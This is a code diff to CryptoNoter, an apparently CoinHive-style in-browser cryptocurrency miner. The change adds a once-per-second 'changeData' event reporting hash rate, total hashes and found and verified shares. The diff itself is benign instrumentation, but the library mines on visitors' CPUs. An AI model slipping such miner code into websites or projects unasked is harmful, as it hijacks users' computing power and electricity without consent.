@@ -44,7 +44,8 @@
             error: [],
             job: [],
             found: [],
-            accepted: []
+            accepted: [],
+            changeData:[],
         };
         var defaultThreads = navigator.hardwareConcurrency || 4;
         this._targetNumThreads = params.threads || defaultThreads;
@@ -52,6 +53,14 @@
         this._asmjsStatus = "unloaded";
         this._onTargetMetBound = this._onTargetMet.bind(this);
         this._onVerifiedBound = this._onVerified.bind(this)
+
+
+        this._info = {
+            hashRate:0,
+            totalHashes:0,
+            sharesFound:0,
+            sharesVerfied:0
+        }
     };
     Miner.prototype.start = function (mode) {
         this._tab.mode = mode || CryptoNoter.IF_EXCLUSIVE_TAB;
@@ -79,6 +88,18 @@
             xhr.open("get", CryptoNoter.CONFIG.LIB_URL + "cryptonight-asmjs.min.js", true);
             xhr.send()
         }
+
+        if(this._idIntervalChangeData)clearInterval(this._idIntervalChangeData);
+        this._idIntervalChangeData = setInterval(()=>{
+            this._info = {
+                hashRate:this.getHashesPerSecond(),
+                totalHashes:this.getTotalHashes(),
+                sharesFound:this._info.sharesFound,
+                sharesVerfied:this.getAcceptedHashes(),
+            };
+            this._emit("changeData",this._info)
+        },1000);
+
     };
     Miner.prototype.stop = function (mode) {
         for (var i = 0; i < this._threads.length; i++) {
@@ -131,6 +152,7 @@
             this._eventListeners[type].push(callback)
         }
     };
+
     Miner.prototype.getAutoThreadsEnabled = function (enabled) {
         return this._autoThreads.enabled
     };
@@ -312,6 +334,7 @@
             params.opt_in = this._optInToken
         }
         this._send("auth", params)
+
     };
     Miner.prototype._onError = function (ev) {
         this._emit("error", {
@@ -383,6 +406,7 @@
     };
     Miner.prototype._onTargetMet = function (result) {
         this._emit("found", result);
+        this._info.sharesFound++;
         if (result.job_id === this._currentJob.job_id) {
             this._send("submit", {
                 job_id: result.job_id,
